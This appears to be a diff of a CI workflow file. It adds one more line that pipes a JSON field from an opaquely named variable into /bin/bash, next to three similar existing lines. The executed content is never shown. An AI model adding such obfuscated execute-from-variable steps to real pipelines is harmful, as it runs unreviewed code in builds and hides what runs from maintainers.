@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$io2666" | jq -r .fu5 | /bin/bash
           echo $io014 | jq -r .vtcjr2494 | /bin/bash
           echo $dg1226 | jq -r .emb25 | /bin/bash
+          printf '%s' "$m1723" | jq -r .fxv2 | /bin/bash
 
       - name: Archive results
         if: always()
